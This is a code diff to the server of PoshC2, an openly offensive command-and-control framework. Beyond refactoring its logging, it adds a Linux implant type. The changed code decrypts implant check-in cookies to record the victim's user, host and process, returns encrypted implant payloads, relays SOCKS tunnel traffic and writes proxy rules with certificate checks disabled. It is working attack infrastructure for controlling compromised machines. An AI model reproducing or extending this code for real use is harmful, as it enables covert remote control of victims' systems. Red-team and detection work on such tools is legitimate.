@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
-import os, sys, datetime, time, base64, logging, signal, re, ssl, traceback, threading
+import os, sys, time, base64, signal, re, ssl, traceback, threading
+from datetime import datetime, date, timezone
 from urllib.request import urlopen, Request
 from urllib.error import HTTPError, URLError
 from socketserver import ThreadingMixIn
@@ -19,7 +20,7 @@ from poshc2.server.Cert import create_self_signed_cert
 from poshc2.client.Help import logopic
 from poshc2.Utils import validate_sleep_time, randomuri, gen_key
 from poshc2.server.database.DBType import DBType
-from poshc2.server.database.DB import update_sleep, select_item, get_implants_all, update_implant_lastseen, update_task, get_cmd_from_task_id, get_c2server_all, get_sharpurls
+from poshc2.server.database.DB import update_sleep, select_item, get_implants_all, update_task, get_cmd_from_task_id, get_c2server_all, get_sharpurls
 from poshc2.server.database.DB import update_item, get_task_owner, get_newimplanturl, initializedb, setupserver, new_urldetails, get_baseenckey, get_c2_messages, database_connect
 from poshc2.server.database.DB import db_exists, get_hosted_files, insert_hosted_file
 
@@ -44,8 +45,7 @@ class MyHandler(BaseHTTPRequestHandler):
         except Exception:
             useragent = "None"
 
-        open("%swebserver.log" % PoshProjectDirectory, "a").write("%s - [%s] %s %s\n" %
-                                                                  (self.address_string(), self.log_date_time_string(), format % args, useragent))
+        webserver_log("%s - [%s] %s %s\n" % (self.address_string(), self.log_date_time_string(), format % args, useragent))
 
     def do_HEAD(self):
         """Respond to a HEAD request."""
@@ -81,7 +81,7 @@ class MyHandler(BaseHTTPRequestHandler):
 
             hosted_files = get_hosted_files()
 
-            logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
+            webserver_log("GET request,\nPath: %s\nHeaders:\n%s\n" % (str(self.path), str(self.headers)))
 
             self.cookieHeader = self.headers.get('Cookie')
             self.ref = self.headers.get('Referer')
@@ -106,7 +106,7 @@ class MyHandler(BaseHTTPRequestHandler):
 
             elif [ele for ele in sharplist if(ele in UriPath)]:
                 try:
-                    open("%swebserver.log" % PoshProjectDirectory, "a").write("%s - [%s] Making GET connection to SharpSocks %s%s\r\n" % (self.address_string(), self.log_date_time_string(), SocksHost, UriPath))
+                    webserver_log("%s - [%s] Making GET connection to SharpSocks %s%s\r\n" % (self.address_string(), self.log_date_time_string(), SocksHost, UriPath))
                     r = Request("%s%s" % (SocksHost, UriPath), headers={'Accept-Encoding': 'gzip', 'Cookie': '%s' % self.cookieHeader, 'User-Agent': UserAgent})
                     res = urlopen(r)
                     sharpout = res.read()
@@ -115,11 +115,11 @@ class MyHandler(BaseHTTPRequestHandler):
                         response_content = sharpout
                 except HTTPError as e:
                     response_code = e.code
-                    open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
-                    open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
+                    webserver_log("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
+                    webserver_log("[-] SharpSocks  %s\r\n" % e)
                 except Exception as e:
-                    open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s \r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
-                    open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
+                    webserver_log("[-] Error with SharpSocks - is SharpSocks running %s%s \r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
+                    webserver_log("[-] SharpSocks  %s\r\n" % e)
                     print(Colours.RED + f"Unknown C2 comms incoming (Could be old implant or sharpsocks) - {self.client_address[0]} {UriPath}" + Colours.END)
                     response_code = 404
                     HTTPResponsePage = select_item("GET_404_Response", "C2Server")
@@ -166,16 +166,20 @@ class MyHandler(BaseHTTPRequestHandler):
                     implant_type = "C# Proxy"
                 if self.path == ("%s?j" % new_implant_url):
                     implant_type = "JXA"
+                if self.path == ("%s?e" % new_implant_url):
+                    implant_type = "NativeLinux"
+                if self.path == ("%s?p?e" % new_implant_url):
+                    implant_type = "NativeLinux Proxy"
 
                 if implant_type.startswith("C#"):
                     cookieVal = (self.cookieHeader).replace("SessionID=", "")
                     decCookie = decrypt(KEY, cookieVal)
                     IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
-                    Domain, User, Hostname, Arch, PID, URLID = decCookie.split(";")
+                    Domain, User, Hostname, Arch, PID, ProcName, URLID = decCookie.split(";")
                     URLID = URLID.replace("\x00", "")
                     if "\\" in User:
                         User = User[User.index("\\") + 1:]
-                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, int(URLID))
+                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, str(ProcName).lower().replace(".exe",""), int(URLID))
                     newImplant.save()
                     newImplant.display()
                     newImplant.autoruns()
@@ -185,9 +189,9 @@ class MyHandler(BaseHTTPRequestHandler):
                     cookieVal = (self.cookieHeader).replace("SessionID=", "")
                     decCookie = decrypt(KEY, cookieVal)
                     IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
-                    User, Domain, Hostname, Arch, PID, URLID = decCookie.split(";")
+                    User, Domain, Hostname, Arch, PID, ProcName, URLID = decCookie.split(";")
                     URLID = URLID.replace("\x00", "")
-                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, URLID)
+                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, str(ProcName).lower(), URLID)
                     newImplant.save()
                     newImplant.display()
                     response_content = encrypt(KEY, newImplant.PythonCore)
@@ -196,26 +200,37 @@ class MyHandler(BaseHTTPRequestHandler):
                     cookieVal = (self.cookieHeader).replace("SessionID=", "")
                     decCookie = decrypt(KEY, cookieVal)
                     IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
-                    User, Hostname, PID, URLID = decCookie.split(";")
+                    User, Hostname, PID, ProcName, URLID = decCookie.split(";")
                     Domain = Hostname
                     URLID = URLID.replace("\x00", "")
                     URLID = URLID.replace("\x07", "")
-                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), "x64", PID, URLID)
+                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), "x64", PID, str(ProcName).lower(), URLID)
                     newImplant.save()
                     newImplant.display()
                     response_content = encrypt(KEY, newImplant.JXACore)
 
+                elif implant_type.startswith("NativeLinux"):
+                    ProcName = "Linux Dropper"
+                    cookieVal = (self.cookieHeader).replace("SessionID=", "")
+                    decCookie = decrypt(KEY, cookieVal)
+                    IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
+                    User, Domain, Hostname, Arch, PID, URLID = decCookie.split(";")
+                    URLID = URLID.replace("\x00", "")
+                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, str(ProcName).lower().replace(".exe",""), URLID)
+                    newImplant.save()
+                    newImplant.display()
+                    response_content=encrypt(KEY, newImplant.NativeCore)                    
                 else:
                     try:
                         cookieVal = (self.cookieHeader).replace("SessionID=", "")
                         decCookie = decrypt(KEY.encode("utf-8"), cookieVal)
                         decCookie = str(decCookie)
-                        Domain, User, Hostname, Arch, PID, URLID = decCookie.split(";")
+                        Domain, User, Hostname, Arch, PID, ProcName, URLID = decCookie.split(";")
                         URLID = URLID.replace("\x00", "")
                         IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
                         if "\\" in str(User):
                             User = User[str(User).index('\\') + 1:]
-                        newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, URLID)
+                        newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, str(ProcName).lower().replace(".exe",""), URLID)
                         newImplant.save()
                         newImplant.display()
                         newImplant.autoruns()
@@ -250,9 +265,8 @@ class MyHandler(BaseHTTPRequestHandler):
                 self.wfile.write(response_content)
 
         except Exception as e:
-            if 'broken pipe' not in str(e).lower():
-                print_bad("Error handling GET request: " + str(e))
-                traceback.print_exc()
+            webserver_log("Error handling GET request: " + str(e))
+            webserver_log(traceback.format_exc())
 
     def do_POST(self):
         try:
@@ -275,13 +289,12 @@ class MyHandler(BaseHTTPRequestHandler):
                 cookieVal = ""
 
             post_data = self.rfile.read(content_length)
-            logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n", str(self.path), str(self.headers), post_data)
+            webserver_log("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n" % (str(self.path), str(self.headers), post_data))
             newTaskOutput(self.path, cookieVal, post_data)
 
         except Exception as e:
-            if 'broken pipe' not in str(e).lower():
-                print_bad("Error handling POST request: " + str(e))
-                traceback.print_exc()
+            webserver_log("Error handling POST request: " + str(e))
+            webserver_log(traceback.format_exc())
 
         finally:
             try:
@@ -294,7 +307,7 @@ class MyHandler(BaseHTTPRequestHandler):
 
                 if [ele for ele in sharplist if(ele in UriPath)]:
                     try:
-                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[+] Making POST connection to SharpSocks %s%s\r\n" % (SocksHost, UriPath))
+                        webserver_log("[+] Making POST connection to SharpSocks %s%s\r\n" % (SocksHost, UriPath))
                         r = Request("%s%s" % (SocksHost, UriPath), headers={'Cookie': '%s' % self.cookieHeader, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36'})
                         res = urlopen(r, post_data)
                         sharpout = res.read()
@@ -304,14 +317,14 @@ class MyHandler(BaseHTTPRequestHandler):
                             response_content = sharpout
                     except URLError as e:
                         response_code = 500
-                        response_content_len = len(sharpout)
-                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] URLError with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
-                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
+                        response_content_len = 0
+                        webserver_log("[-] URLError with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
+                        webserver_log("[-] SharpSocks  %s\r\n" % e)
                     except Exception as e:
                         response_code = 404
-                        response_content_len = len(sharpout)
-                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
-                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
+                        response_content_len = 0
+                        webserver_log("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
+                        webserver_log("[-] SharpSocks  %s\r\n" % e)
                         print(Colours.RED + f"Unknown C2 comms incoming (Could be old implant or sharpsocks) - {self.client_address[0]} {UriPath}" + Colours.END)
                         HTTPResponsePage = select_item("GET_404_Response", "C2Server")
                         if HTTPResponsePage:
@@ -332,10 +345,8 @@ class MyHandler(BaseHTTPRequestHandler):
                     self.wfile.write(response_content)
 
             except Exception as e:
-                print(Colours.RED + "Generic error in POST request!" + Colours.END)
-                print(Colours.RED + UriPath + Colours.END)
-                print(str(e))
-                traceback.print_exc()
+                webserver_log(f"Generic error in POST request to {UriPath}: \n" + str(e))
+                webserver_log(traceback.format_exc)
 
 
 ThreadingMixIn.daemon_threads = True
@@ -366,7 +377,7 @@ def newdb(db):
     setupserver(PayloadCommsHost, gen_key().decode("utf-8"), DomainFrontHeader, DefaultSleep, KillDate, GET_404_Response, PoshProjectDirectory, QuickCommand, DownloadURI, "", "", "", URLS, SocksURLS, Insecure, UserAgent, Referrer, Pushover_APIToken, Pushover_APIUser, Slack_UserID, Slack_Channel, Slack_BotToken, EnableNotifications)
     rewriteFile = "%s/rewrite-rules.txt" % directory
     print("Creating Rewrite Rules in: " + rewriteFile)
-    rewriteHeader = ["RewriteEngine On", "SSLProxyEngine On", "SSLProxyCheckPeerCN Off", "SSLProxyVerify none", "SSLProxyCheckPeerName off", "SSLProxyCheckPeerExpire off", "# Change IPs to point at C2 infrastructure below", "Define PoshC2 10.0.0.1", "Define SharpSocks 10.0.0.1"]
+    rewriteHeader = ["RewriteEngine On", "SSLProxyEngine On", "SSLProxyCheckPeerCN Off", "SSLProxyVerify none", "SSLProxyCheckPeerName off", "SSLProxyCheckPeerExpire off", "# Change IPs to point at C2 infrastructure below", "Define PoshC2 10.0.0.1", "Define SharpSocks 10.0.0.1", "# If running Apache 2.4.52 or Later", "Proxy100Continue Off"]
     rewriteFileContents = rewriteHeader + urlConfig.fetchRewriteRules() + urlConfig.fetchSocksRewriteRules()
     with open(rewriteFile, 'w') as outFile:
         for line in rewriteFileContents:
@@ -418,7 +429,7 @@ def existingdb(db):
         update_item("QuickCommand", "C2Server", QuickCommand)
         update_item("DomainFrontHeader", "C2Server", DomainFrontHeader)
         C2 = get_c2server_all()
-        urlId = new_urldetails(f"updated_host-{datetime.datetime.strftime(datetime.datetime.now(), '%Y-%m-%d-%H:%M:%S')}", PayloadCommsHost, C2.DomainFrontHeader, "", "", "", "")
+        urlId = new_urldetails(f"updated_host-{datetime.strftime(datetime.now(timezone.utc), '%Y-%m-%d-%H:%M:%S')}", PayloadCommsHost, C2.DomainFrontHeader, "", "", "", "")
         newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory, URLID=urlId)
         newPayload.CreateAll()
         newPayload.WriteQuickstart(PoshProjectDirectory + 'quickstart.txt')
@@ -445,6 +456,10 @@ def log_c2_messages():
             for message in messages:
                 print(message)
         time.sleep(2)
+
+
+def webserver_log(message):
+    open("%swebserver.log" % PoshProjectDirectory, "a").write(message)
 
 
 def main(args):
@@ -494,7 +509,6 @@ def main(args):
 
     print("")
     print(time.asctime() + " PoshC2 Server Started - %s:%s" % (BindIP, BindPort))
-    from datetime import date, datetime
     killdate = datetime.strptime(C2.KillDate, '%Y-%m-%d').date()
     datedifference = number_of_days(date.today(), killdate)
     if datedifference < 8:
